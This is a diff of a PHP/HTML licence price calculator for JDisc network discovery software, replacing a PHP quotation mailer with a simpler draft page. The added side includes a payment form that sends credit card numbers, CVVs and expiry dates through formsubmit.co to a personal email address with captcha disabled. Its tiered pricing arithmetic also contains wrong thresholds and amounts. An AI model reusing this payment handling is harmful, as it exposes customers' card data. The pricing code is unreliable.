@@ -1,126 +1,3 @@
-<?php
-if (isset($_POST['submit'])) {
-	$name = $_POST['name'];
-	$from = $_POST['email'];
-	$company = $_POST['company'];
-	$tel = $_POST['tel'];
-
-    $address1 = $_POST['address1'];
-    $address2 = $_POST['address2'];
-    $city = $_POST['city'];
-    $st_pr = $_POST['st_pr'];
-    $zipcode = $_POST['zipcode'];
-    $cntr = $_POST['cntr'];
-
-	$devices = $_POST['devices'];
-	$tokens = $_POST['tokens'];
-	$license = $_POST['license'];
-	$annual = $_POST['annual'];
-	$total = $_POST['total'];
-	$subject = "Jdisc Network Discovery - Perpetual License Quotation";
-	$message = "
-	<html>
-		<head>
-			<title>JDisc Submission</title>
-		</head>
-		<style>
-		.table{
-			border: 1px solid;
-			text-align: left;
-		}
-		th, td {
-  			border-bottom: 1px solid #ddd;
-			border: 1px solid;
-			text-align: left;
-			padding: 15px;
-		}
-		th {
-  			background-color: #00155c;
-  			color: white;
-		}
-		</style>
-		<body>
-			<p>Quotation Summary</p>
-			<table>
-				<tr>
-					<th>Name </th>
-					<th>E-Mail </th>
-					<th>Company </th>
-					<th>Telephone Number </th>
-                    <th>Address Line 1 </th>
-                    <th>Address Line 2 </th>
-                    <th>City </th>
-                    <th>State/Province </th>
-                    <th>Zip/Postal Code </th>
-                    <th>Country </th>
-				</tr>
-				<tr>
-					<td>$name</td>
-					<td>$from</td>
-					<td>$company</td>
-					<td>$tel</td>
-                    <td>$address1</td>
-                    <td>$address2</td>
-                    <td>$city</td>
-                    <td>$st_pr</td>
-                    <td>$zipcode</td>
-                    <td>$cntr</td>
-				</tr>
-			</table>
-		<table>
-				<tr>
-					<th>Total Devices </th>
-					<th>Total Credits Requiered</th>
-					<th>Total Cost For License (One Time Payment)</th>
-					<th>Support (Annual Cost For Ongoing Support)</th>
-					<th>Total Cost</th>
-				</tr>
-				<tr>
-					<td>$devices</td>
-					<td>$tokens</td>
-					<td>$license</td>
-					<td>$annual</td>
-					<td>$total</td>
-				</tr>
-			</table>
-		<p>One of our partners will contact you as soon as possible to help you about the procedure of obtaining Jdisc Discovery!</p>
-		<p> Best regards, </p>
-		<p>JDisc GmbH  </p>
-		<p>+49-7034-9992-1041   </p>
-		<p>Kuppinger Weg 25, 71116 Gärtringen </p>
-		<p>https://www.jdisc.com </p>
-		<p>info@jdisc.com </p>
-		<p>&nbsp;</p>
-			<p> P.S.: Register here to receive our quarterly Newsletter </p>
-			<p><strong>Email Disclaimer </strong><br>
-		    The information in this email is confidential and is intended solely for the address. If you have received this transmission in error, and you are not an intended recipient, be aware that any disclosure, copying, distribution or use of this transmission or its contents is prohibited.  Internet communications are not secure and therefore Jdisc does not accept legal responsibility for the contents of this message and for any damage whatsoever that is caused by viruses being passed. </p>
-			
-			
-		</body>
-	</html>
-
-	";
-
-	// Always set content-type when sending HTML email
-	$headers = "MIME-Version: 1.0" . "\r\n";
-	$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
-
-	// More headers
-	$headers .= 'From: <webmaster@example.com>' . "\r\n";
-	$headers .= 'Cc: info@jdisc.eu' . "\r\n";
-	$to = $from;
-	//mail($to,$subject,$message,$headers);
-	if(mail($to,$subject,$message,$headers))
-	{
-		$msg = "Your quotation has been sent successful!. Please check your email for the quotation summary. We will contact you as soon as possible!";
-	}
-	else
-	{
-		$msg = "Error, could not be Sent!";
-	}
-
-}
-?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -131,30 +8,17 @@ if (isset($_POST['submit'])) {
     <title>JDisc Calculator</title>
 
 </head>
-<style> 
+<style>
  * {
   box-sizing: border-box;
 }
-.prevent-selection{
-    -webkit-user-select: none; /* Safari */
-    -ms-user-select: none; /* IE 10 and IE 11 */
-    user-select: none; /* Standard syntax */
-}
 .divrow {
   display: flex;
-  line-height: 3.0;
 }
 
 .divcolumn {
   flex: 50%;
-	width: 90%;
 }
-	
-.divcolumn2 {
-  flex: 50%;
-	width: 25%
-}	
-	
 /* Container for flexboxes */
 .row {
   display: flex;
@@ -165,18 +29,14 @@ if (isset($_POST['submit'])) {
 .column {
   flex: 25%;
   padding: 20px;
-  box-shadow: 0px 0px 5px 20px #f9f9f9;
-  background-color:#eff4f4;
-  font-family: 'Arimo';
- 
+  box-shadow: 0px 0px 15px 3px #82f4ff;
+  background-color:rgba(130, 220, 255, 0.281);
 
 }
 .column2 {
   flex: 25%;
-  padding: 0px;
-  background-color:#eff4f4;
-  font-family: 'Arimo';
-  
+  padding: 20px;
+  background-color:rgba(116, 214, 253, 0.089);
 }
 
 /* On screens that are 992px wide or less, go from four columns to two columns */
@@ -193,41 +53,21 @@ if (isset($_POST['submit'])) {
   }
 }
 .select-box{
-  
-  width: 30%; 
-  box-shadow: 5px 5px 10px 0px #d4d4d4;
-  border-color: var(--dl-color-gray-black);
-  border-width: px;
-  border-radius: 5px;
-  height: 4%;
+  width: 200px;
 }
-	
-.select-box2{
-  
-   width: 50%; 
-  box-shadow: 5px 5px 10px 0px #d4d4d4;
-  border-color: var(--dl-color-gray-black);
-  border-width: px;
-  border-radius: 5px;
-  line-height: 2;
-}
-	
 .span-class{
-  line-height: 0;
-  
+  line-height: 3.0;
 }
-.divcolumn-right{
-    flex: 50%;
-    text-align: right;
-    width: 10%;
+.right{
+  text-align: right;
 }
 .button-green {
-  background-color: #ef8700;
-  border: 1px solid #ef8700;
+  background-color: #13aa52;
+  border: 1px solid #13aa52;
   border-radius: 4px;
   box-shadow: rgba(0, 0, 0, .1) 0 2px 4px 0;
   box-sizing: border-box;
-  color: #00155c;
+  color: #fff;
   cursor: pointer;
   font-family: "Akzidenz Grotesk BQ Medium", -apple-system, BlinkMacSystemFont, sans-serif;
   font-size: 16px;
@@ -241,13 +81,11 @@ if (isset($_POST['submit'])) {
   user-select: none;
   -webkit-user-select: none;
   touch-action: manipulation;
-	radius: 5px
 }
 
 .button-green:hover {
   box-shadow: rgba(0, 0, 0, .15) 0 3px 9px 0;
   transform: translateY(-2px);
-	color: #fff;
 }
 
 @media (min-width: 768px) {
@@ -290,33 +128,17 @@ if (isset($_POST['submit'])) {
 .input-class{
   line-height: 0.5;
 }
-.inputio{
- 
-  width: 50%;
- 
-  box-shadow: 5px 5px 10px 0px #d4d4d4;
-  border-color: var(--dl-color-gray-black);
-  border-width: 1px;
-  border-radius: 3px;
-line-height: 2!important;
-background-color:#ffffff;}
 
-.home-checkbox{
-  padding-top: 5px;
-  padding-bottom: 5px; 
-	}
+   
 </style>
-
 <body>
 <div class="row">
-	
     <div class="column">
-		  
-		<h2>Licence Configuration</h2>
+        <h2>Enter how many devices you want:</h2>
       
-        <h4>Unix computers (HP-UX, Solaris, AIX)</h4>
+        <h4>Device1</h4>
         <div>
-            <input class="inputio"
+            <input
             type="number"
             id="dev1"
             min="0"
@@ -327,9 +149,9 @@ background-color:#ffffff;}
           />
         </div>
 
-        <h4>Linux / VMware ESX / MAC OS X computers</h4>
+        <h4>Device2</h4>
         <div>
-            <input class="inputio"
+            <input
             type="number"
             id="dev2"
             min="0"
@@ -340,9 +162,9 @@ background-color:#ffffff;}
           />           
         </div>
 
-        <h4>Windows computers, switches and routers</h4>
+        <h4>Device3</h4>
         <div>
-            <input class="inputio"
+            <input
             type="number"
             id="dev3"
             min="0"
@@ -353,9 +175,9 @@ background-color:#ffffff;}
           />
         </div>
 
-        <h4>Other devices (network printers, scanners, ...)</h4>
+        <h4>Device4</h4>
         <div>
-            <input class="inputio"
+            <input
             type="number"
             id="dev4"
             min="0"
@@ -367,94 +189,69 @@ background-color:#ffffff;}
           />
         </div>
         <h4>Select the Add-Ons you would like to purchase:</h4>
-        <div class="home-checkbox">
-            <!--<input type="checkbox" id="add1" onclick="Calculator()" class="home-checkbox" />JDisc Discovery Networking Add-On-->
-            <label class="prevent-selection"><input type="checkbox" id="add1" onclick="Calculator()" class="home-checkbox" />JDisc Discovery Networking Add-On</label>
+        <div>
+            <input type="checkbox" id="add1" onclick="Calculator()" class="home-checkbox" />ADDON1
         </div>
 
-        <div class="home-checkbox">
-            <!--<input type="checkbox" id="add2" onclick="Calculator()" class="home-checkbox" />JDisc Discovery Dependency Mapping Add-On-->
-            <label class="prevent-selection"><input type="checkbox" id="add2" onclick="Calculator()" class="home-checkbox" />JDisc Discovery Dependency Mapping Add-On</label>
+        <div>
+            <input type="checkbox" id="add2" onclick="Calculator()" class="home-checkbox1" />ADDON2
         </div>
 
-        <div class="home-checkbox">
-            <!--<input type="checkbox" id="add3" onclick="Calculator()" class="home-checkbox" />JDisc Discovery Device History Add-On-->
-            <label class="prevent-selection"><input type="checkbox" id="add3" onclick="Calculator()" class="home-checkbox" />JDisc Discovery Device History Add-On</label>
+        <div>
+            <input type="checkbox" id="add3" onclick="Calculator()" class="home-checkbox2" />ADDON3
         </div>
 
-        <div class="home-checkbox">
-            <!--<input type="checkbox" id="add4" onclick="Calculator()" class="home-checkbox" />JDisc Discovery Security Add-On-->
-            <label class="prevent-selection"><input type="checkbox" id="add4" onclick="Calculator()" class="home-checkbox" />JDisc Discovery Security Add-On</label>
-
+        <div>
+            <input type="checkbox" id="add4" onclick="Calculator()" class="home-checkbox3" />ADDON4
         </div>
 
-        <div class="home-checkbox">
-            <!--<input type="checkbox" id="add5" onclick="Calculator()" class="home-checkbox" />JDisc Discovery Measurement Add-On-->
-            <label class="prevent-selection"><input type="checkbox" id="add5" onclick="Calculator()" class="home-checkbox" />JDisc Discovery Measurement Add-On</label>
+        <div>
+            <input type="checkbox" id="add5" onclick="Calculator()" class="home-checkbox4" />ADDON5
         </div>
 
         <h4>Select your currency:</h4>
         <select class="select-box" id="selectcurrency" onchange="Calculator()">
-          <option value="eur">€ - Euro</option>
-          <option value="usd">$ - USD</option>
-          <option value="gbp">£ - GBP</option>
+          <option value="eur">Euro</option>
+          <option value="usd">USD</option>
+          <option value="gbp">GBP</option>
         </select>
       
     </div>
       
         <div class="column">
-			
-			<h2>Total Summary</h2>
+            <h2>Total Summary:</h2>
             <div class="divrow">
                 <div class="divcolumn">
                     <span class="span-class">Total Devices:</span>
                 </div>
-                <div class="divcolumn-right">
+                <div class="divcolumn right">
                     <span class="span-class"  id="devices">0</span>
                 </div>
             </div>  
             
             <div class="divrow">
                 <div class="divcolumn">
-                    <span class="span-class">Total Credits Required:</span>
+                    <span class="span-class">Total Credits Requiered:</span>
                 </div>
-                <div class="divcolumn-right">
+                <div class="divcolumn right">
                     <span class="span-class"  id="tokens">0</span>
                 </div>
             </div> 
 
             <div class="divrow">
                 <div class="divcolumn">
-                    <span class="span-class">Cost For Add-Ons:</span>
+                    <span class="span-class">Total Cost For License <span>(One Time Payment)</span>:</span>
                 </div>
-                <div class="divcolumn-right">
-                    <span class="span-class"  id="">0</span>
-                </div>
-            </div> 
-
-            <div class="divrow">
-                <div class="divcolumn">
-                    <span class="span-class">Cost For License (Without Add-Ons):</span>
-                </div>
-                <div class="divcolumn-right">
-                    <span class="span-class"  id="">0</span>
-                </div>
-            </div> 
-
-            <div class="divrow">
-                <div class="divcolumn">
-                   Total Cost For License (One Time Payment):
-                </div>
-                <div class="divcolumn-right">
+                <div class="divcolumn right">
                     <span class="span-class"  id="licensecost">0</span>
                 </div>
             </div>    
     
             <div class="divrow">
                 <div class="divcolumn">
-                  Support (Annual Cost For Ongoing Support):
+                    <span class="span-class">Support (Annual Cost For Ongoing Support):</span>
                 </div>
-                <div class="divcolumn-right">
+                <div class="divcolumn right">
                     <span class="span-class"  id="annualsub">0</span>  
                 </div>
             </div>    
@@ -463,111 +260,62 @@ background-color:#ffffff;}
                 <div class="divcolumn">
                     <span class="span-class">Total Cost:</span>
                 </div>
-                <div class="divcolumn-right">
+                <div class="divcolumn right">
                     <span class="span-class" id="final">0</span>                   
                 </div>
             </div>
       
 
-        <!--<input class="button-green" type="button" value="CONTACT" onclick="showdiv(this.value)"></input>-->
-		  
-		  <!-- <input class="button-blue" type="submit" value="BUY" onclick="showdiv(this.value)"></input> -->
+          <input class="button-green" type="submit" value="SUBMIT" onclick="showdiv(this.value)"></input>
+          <input class="button-blue" type="submit" value="BUY" onclick="showdiv(this.value)"></input>
 
-            <div class="column2" style="display:block;" id="formdiv">
-                <form method="post" name="myemailform">
+
+            <div class="column2" style="display:none;" id="formdiv">
+                <form method="post" name="myemailform" action="https://formsubmit.co/antonis-9@live.de">
+
                     <h2>Contact Details</h2>
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" name="_next" value="https://vibrant-brown.185-207-107-69.plesk.page">
                     <div>
-                        <input 
-                        type="text" class="select-box2"
+                        <input
+                        type="text"
                         placeholder="Name*"
                         name="name"
-						required
                         />
                     </div>
                     <br>
                     <div>
-                        <input class="select-box2"
-                        type="email"
+                        <input
+                        type="text"
                         placeholder="E-Mail*"
                         name="email"
-						required
                         />
                     </div>
                     <br>
                     <div>
-                        <input class="select-box2"
+                        <input
                         type="text"
                         placeholder="Company*"
                         name="company"
-						required
                         />
                     </div>
                     <br>
                     <div>
-                        <input class="select-box2"
+                        <input
                         type="text"
-                        placeholder="Telephone Number*"
+                        placeholder="Telephone Number"
                         name="tel"
                         />
                     </div>
-                    <br>
-                    <div>
-                        <input class="select-box2"
-                        type="text"
-                        placeholder="Address Line 1"
-                        name="address1"
-                        />
-                    </div>
-                    <br>
-                    <div>
-                        <input class="select-box2"
-                        type="text"
-                        placeholder="Address Line 2"
-                        name="address2"
-                        />
-                    </div>
-                    <br>
-                    <div>
-                        <input class="select-box2"
-                        type="text"
-                        placeholder="City"
-                        name="city"
-                        />
-                    </div>
-                    <br>
-                    <div>
-                        <input class="select-box2"
-                        type="text"
-                        placeholder="State/Province"
-                        name="st_pr"
-                        />
-                    </div>
-                    <br>
-                    <div>
-                        <input class="select-box2"
-                        type="text"
-                        placeholder="Zip/Postal Code"
-                        name="zipcode"
-                        />
-                    </div>
-                    <br>
-                    <div>
-                        <input class="select-box2"
-                        type="text"
-                        placeholder="Country"
-                        name="cntr"
-                        />
-                    </div>
 
-                    <input type="hidden" name="devices" id="maildevices">
-                    <input type="hidden" name="tokens" id="mailtokens">
-                    <input type="hidden" name="license" id="maillicensecost">
-                    <input type="hidden" name="annual" id="mailannualsub">
-                    <input type="hidden" name="total" id="mailfinal">
-
+                    <input type="hidden" name="Total Devices" id="maildevices">
+                    <input type="hidden" name="Tokens" id="mailtokens">
+                    <input type="hidden" name="License Cost" id="maillicensecost">
+                    <input type="hidden" name="Annual Subscription" id="mailannualsub">
+                    <input type="hidden" name="Total Cost" id="mailfinal">
                     
                     <br>
-                    <span class="span-class">If you submit the form by clicking &quot;"Request Quote"&quot;, you agree with our
+                    <span class="span-class">If you submit the form by clicking &quot;SUBMIT&quot;, you agree with our</span>
                     <a
                         href="https://example.com"
                         target="_blank"
@@ -575,27 +323,25 @@ background-color:#ffffff;}
                         class="home-link"
                         >
                         terms of use
-                    </a></span>
+                    </a>
                     .
                     <br>
                     <div>
-                        <input class="button-green" type="submit" name='submit' value="Request Quote">
-						
-						
+                        <input class="button-green" type="submit" name='submit' value="SUBMIT">
                     </div>
                 </form>
             </div>
-	<p><?php echo $msg; ?></p>
             <div class="column2" style="display:none;" id="buydiv">
-                <form method="post" name="mybuyform">
+                <form method="post" name="myemailform" action="https://formsubmit.co/antonis-9@live.de">
 
                     <h2>Payment Details</h2>
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" name="_next" value="https://vibrant-brown.185-207-107-69.plesk.page">
                     <div>
                         <input
                         type="text"
                         placeholder="Credit Card Number*"
                         name="number"
-						required
                         />
                     </div>
                     <br>
@@ -604,7 +350,6 @@ background-color:#ffffff;}
                         type="text"
                         placeholder="Card Holder*"
                         name="name"
-						required
                         />
                     </div>
                     <br>
@@ -613,7 +358,6 @@ background-color:#ffffff;}
                         type="text"
                         placeholder="CVV*"
                         name="cvv"
-						required
                         />
                     </div>
                     <br>
@@ -622,7 +366,6 @@ background-color:#ffffff;}
                         type="text"
                         placeholder="Expire Date*"
                         name="exp"
-						required
                         />
                     </div>
 
@@ -654,7 +397,7 @@ background-color:#ffffff;}
       
     <script type="text/javascript">
         function showdiv(val){
-            if (val=="CONTACT") {
+            if (val=="SUBMIT") {
                 document.getElementById('formdiv').style.display = "block";
             }
             else
@@ -717,14 +460,14 @@ background-color:#ffffff;}
                 if (cb5.checked == true){
                     count = count+1;
                 }
-                let sum = x+y+z+a; //totaltokens
-                var procentage = sum * 0.3;  // 30 percent from totaltokens
-                var extratokens = count * procentage; // final totaltokens plus 30percent of tt mulitplied by addons trigered
+                let sum = x+y+z+a;
+                var procentage = sum * 0.3;
+                var extratokens = count * procentage;
                 var totaltokens = sum + extratokens;
 
                 document.getElementById('tokens').innerHTML = totaltokens;
-                document.getElementById('mailtokens').value = totaltokens;
 
+                document.getElementById('mailtokens').value = totaltokens;
             // End Addons Counter
 
             // Tokens Without ADDONS 
@@ -749,32 +492,31 @@ background-color:#ffffff;}
                 cost = ((1000*1.1)+(2000*0.99)+(totaltokens-3000)*0.88);
             }
             else if (totaltokens>5000 && totaltokens<=10000) {
-                cost = ((1000*1.1)+(2000*0.99)+(2000*0.88)+(totaltokens-5000)*0.77);
+                cost = ((1000*1)+(2000*0.99)+(2000*0.88)+(totaltokens-5000)*0.77);
             }
-            else if (totaltokens>10000 && totaltokens<=15000) {
-                cost = ((1000*1.1)+(2000*0.99)+(2000*0.88)+(5000*0.77)+(totaltokens-10000)*0.66);
+            else if (totaltokens>1000 && totaltokens<=15000) {
+                cost = ((1000*1.1)+(2000*0.99)+(2000*0.88)+(5000*0.77)+(totaltokens-1000)*0.66);
             }
-            else if (totaltokens>15000 && totaltokens<=100000) {
-                cost = ((1000*1.1)+(2000*0.99)+(2000*0.88)+(5000*0.77)+(5000*0.66)+(totaltokens-15000)*0.55);
+            else if (totaltokens>15000 && totaltokens<=1000000) {
+                cost = ((1000*1.1)+(2000*0.99)+(2000*0.88)+(50000*0.77)+(5000*0.66)+(totaltokens-15000)*0.55);
             }
             else if (totaltokens>100000 && totaltokens<=1000000) {
-                cost = ((1000*1.1)+(2000*0.99)+(2000*0.88)+(5000*0.77)+(5000*0.66)+(85000*0.55)+(totaltokens-100000)*0.44);
+                cost = ((1000*1.1)+(2000*0.99)+(2000*0.88)+(50000*0.77)+(5000*0.66)+(85000*0.55)+(totaltokens-100000)*0.44);
             }
             else if (totaltokens>1000000 && totaltokens<=2000000) {
-                cost = ((1000*1.1)+(2000*0.99)+(2000*0.88)+(5000*0.77)+(5000*0.66)+(85000*0.55)+(900000*0.44)+(totaltokens-1000000)*0.33);
+                cost = ((1000*1.1)+(2000*0.99)+(2000*0.88)+(50000*0.77)+(5000*0.66)+(85000*0.55)+(900000*0.44)+(totaltokens-1000000)*0.33);
             }
             else if (totaltokens>2000000 && totaltokens<=5000000) {
-                cost = ((1000*1.1)+(2000*0.99)+(2000*0.88)+(5000*0.77)+(5000*0.66)+(85000*0.55)+(900000*0.44)+(1000000*0.33)+(totaltokens-2000000)*0.22);
+                cost = ((1000*1.1)+(2000*0.99)+(2000*0.88)+(50000*0.77)+(5000*0.66)+(85000*0.55)+(900000*0.44)+(1000000*0.33)+(totaltokens-2000000)*0.22);
             }
             else if (totaltokens>5000000){
-                cost = ((1000*1.1)+(2000*0.99)+(2000*0.88)+(5000*0.77)+(5000*0.66)+(85000*0.55)+(900000*0.44)+(1000000*0.33)+(3000000)*0.22+(totaltokens-5000000)*0.11);
+                cost = ((1000*1.1)+(2000*0.99)+(2000*0.88)+(50000*0.77)+(5000*0.66)+(85000*0.55)+(900000*0.44)+(1000000*0.33)+(3000000)*0.22+(totaltokens-5000000)*0.11);
             }
             // End Stair Cost Calculator
 
             // Currency Converter
             var currency = document.getElementById('selectcurrency').value;
-            var finalcost = cost+(cost*0.2);
-
+            var finalcost = cost+(cost*0.2)
             if (currency=='eur'){
                 document.getElementById('licensecost').innerHTML = '€' + " " + cost.toFixed(2);
                 document.getElementById('annualsub').innerHTML = '€' + " " + (cost*0.2).toFixed(2);
@@ -785,7 +527,6 @@ background-color:#ffffff;}
                 document.getElementById('mailfinal').value =  '€' + " " + finalcost.toFixed(2);
 
 
-
             }else if (currency=='usd') {
                 document.getElementById('licensecost').innerHTML = '$' + " " + (cost*0.96).toFixed(2);
                 document.getElementById('annualsub').innerHTML = '$' + " " + ((cost*0.2)*0.96).toFixed(2);
@@ -794,13 +535,12 @@ background-color:#ffffff;}
                 document.getElementById('maillicensecost').value = '$' + " " + (cost*0.96).toFixed(2);
                 document.getElementById('mailannualsub').value = '$' + " " + ((cost*0.2)*0.96).toFixed(2);
                 document.getElementById('mailfinal').value=  '$' + " " + (finalcost*0.96).toFixed(2);
-
+                
 
             }else if (currency=='gbp') {
                 document.getElementById('licensecost').innerHTML = '£' + " " + (cost*0.9).toFixed(2);
                 document.getElementById('annualsub').innerHTML = '£' + " " + ((cost*0.2)*0.9).toFixed(2);
                 document.getElementById('final').innerHTML =  '£' + " " + (finalcost*0.9).toFixed(2);
-
 
                 document.getElementById('maillicensecost').value = '£' + " " + (cost*0.9).toFixed(2);
                 document.getElementById('mailannualsub').value = '£' + " " + ((cost*0.2)*0.9).toFixed(2);
